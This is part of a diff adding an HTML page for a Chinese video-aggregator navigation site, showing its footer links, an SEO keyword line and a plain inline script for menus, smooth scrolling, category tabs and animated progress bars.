+          <span class="dot" aria-hidden="true">影</span>
+          <span><b>影视大全纯净版</b><small>纯净 · 无广告 · 无弹窗</small></span>
+        </a>
+        <p>影视大全纯净版（yingshidaquanchunjingban.cn）聚合电影、电视剧、综艺、动漫、短剧等高清资源入口，全程无贴片、无弹窗、无诱导，干净看片。</p>
+        <span class="cln">当前纯净等级：极净</span>
+      </div>
+      <div>
+        <h4>站点栏目</h4>
+        <ul><li><a href="#home">网站首页</a></li><li><a href="#list">纯净清单</a></li><li><a href="#cat">分类目录</a></li><li><a href="#promise">纯净承诺</a></li></ul>
+      </div>
+      <div>
+        <h4>内容频道</h4>
+        <ul><li><a href="#">电影频道</a></li><li><a href="#">热播剧集</a></li><li><a href="#">综艺娱乐</a></li><li><a href="#">动漫番剧</a></li></ul>
+      </div>
+      <div>
+        <h4>帮助与支持</h4>
+        <ul><li><a href="#index">纯净指数</a></li><li><a href="#rev">用户评价</a></li><li><a href="#">使用帮助</a></li><li><a href="#">意见反馈</a></li></ul>
+      </div>
+    </div>
+    <div class="cp">
+      <span>© <span id="yr">2026</span> 影视大全纯净版 · 网站网址：<a href="https://yingshidaquanchunjingban.cn.github.io/">https://yingshidaquanchunjingban.cn.github.io/</a> · 保留所有权利</span>
+      <span class="kw">聚焦关键词：影视大全纯净版 · yingshidaquanchunjingban.cn · 纯净影视导航 · 无广告看片 · 高清电影在线观看</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  document.getElementById("yr").textContent = new Date().getFullYear();
+
+  var mbtn = document.getElementById("mbtn"), menu = document.getElementById("menu");
+  mbtn.addEventListener("click", function(){
+    var o = menu.classList.toggle("on");
+    mbtn.classList.toggle("on", o);
+    mbtn.setAttribute("aria-expanded", o ? "true" : "false");
+  });
+  menu.addEventListener("click", function(e){
+    if (e.target.tagName === "A") {
+      menu.classList.remove("on"); mbtn.classList.remove("on");
+      mbtn.setAttribute("aria-expanded", "false");
+    }
+  });
+
+  var qs = document.querySelectorAll('a[href^="#"]');
+  for (var i = 0; i < qs.length; i++) {
+    (function(a){
+      a.addEventListener("click", function(ev){
+        var id = a.getAttribute("href");
+        if (id && id.length > 1 && document.querySelector(id)) {
+          ev.preventDefault();
+          document.querySelector(id).scrollIntoView({behavior:"smooth", block:"start"});
+        }
+      });
+    })(qs[i]);
+  }
+
+  /* 分类目录：数据驱动切换，避免重复 DOM 结构 */
+  var data = {
+    m: {name:"电影频道", desc:"按题材与类型细分，新片经典均有收录", tags:["动作","喜剧","科幻","悬疑","爱情","动画","恐怖","纪录片","文艺","战争","犯罪","奇幻"],
+        c1:"更新频率：每周三上新", c2:"画质：高清 / 超清", c3:"入口：直达点播"},
+    t: {name:"电视剧集", desc:"国产剧、港剧、美剧、日韩剧，连载与全季合集同步整理", tags:["都市","古装","刑侦","家庭","历史","医疗","律政","军旅","甜宠","仙侠","年代","商战"],
+        c1:"更新频率：每日连载", c2:"画质：高清为主", c3:"入口：直达点播"},
+    v: {name:"综艺娱乐", desc:"真人秀、脱口秀、音乐竞演、户外旅行，最新一期即时更新", tags:["真人秀","脱口秀","音乐","美食","旅行","访谈","选秀","游戏","生活","文化"],
+        c1:"更新频率：按期更新", c2:"画质：高清", c3:"入口：直达点播"},
+    a: {name:"动漫番剧", desc:"国漫原创、日本新番、经典剧场版，多语字幕可选", tags:["热血","治愈","奇幻","科幻","日常","校园","冒险","机甲","推理","运动"],
+        c1:"更新频率：每周追番", c2:"画质：高清 / 超清", c3:"入口：直达点播"},
+    s: {name:"短剧专区", desc:"竖屏短剧精选，节奏明快，全集一次看完", tags:["都市","爱情","逆袭","甜宠","悬疑","重生","霸总","古言","种田","复仇"],
+        c1:"更新频率：每日新增", c2:"画质：高清", c3:"入口：直达点播"},
+    d: {name:"纪录片", desc:"自然、历史、人文与科技题材，高分口碑精选", tags:["自然","历史","人文","科技","宇宙","动物","美食","考古","社会","艺术"],
+        c1:"更新频率：月度上新", c2:"画质：4K / 超清", c3:"入口：直达点播"}
+  };
+  var nameEl = document.querySelector("[data-name]"), descEl = document.querySelector("[data-desc]");
+  var tagsEl = document.querySelector("[data-tags]");
+  var c1 = document.querySelector("[data-chip1]"), c2 = document.querySelector("[data-chip2]"), c3 = document.querySelector("[data-chip3]");
+  function render(key){
+    var d = data[key];
+    if (!d) return;
+    nameEl.textContent = d.name;
+    descEl.textContent = d.desc;
+    tagsEl.innerHTML = "";
+    for (var i = 0; i < d.tags.length; i++) {
+      var a = document.createElement("a");
+      a.href = "#";
+      if (i < 3) a.className = "hot";
+      a.textContent = d.tags[i];
+      tagsEl.appendChild(a);
+    }
+    c1.innerHTML = "<b>" + d.c1.split("：")[0] + "：</b>" + d.c1.split("：")[1];
+    c2.innerHTML = "<b>" + d.c2.split("：")[0] + "：</b>" + d.c2.split("：")[1];
+    c3.innerHTML = "<b>" + d.c3.split("：")[0] + "：</b>" + d.c3.split("：")[1];
+  }
+  var cbs = document.querySelectorAll(".cb");
+  for (var j = 0; j < cbs.length; j++) {
+    cbs[j].addEventListener("click", function(){
+      for (var k = 0; k < cbs.length; k++) cbs[k].classList.remove("on");
+      this.classList.add("on");
+      render(this.getAttribute("data-t"));
+    });
+  }
+  render("m");
+
+  /* 纯净指数进度条：进入视口时触发 */
+  var tracks = document.querySelectorAll(".track i");
+  if ("IntersectionObserver" in window) {
+    var io = new IntersectionObserver(function(ents){
+      for (var n = 0; n < ents.length; n++) {
+        if (ents[n].isIntersecting) {
+          var w = ents[n].target.getAttribute("data-w");
+          if (w) ents[n].target.style.width = w + "%";
+          io.unobserve(ents[n].target);
+        }
+      }
+    }, {threshold:.25});
+    for (var t = 0; t < tracks.length; t++) io.observe(tracks[t]);
+  } else {
+    for (var t2 = 0; t2 < tracks.length; t2++) tracks[t2].style.width = tracks[t2].getAttribute("data-w") + "%";
+  }
+})();
+</script>
+</body>
+</html>
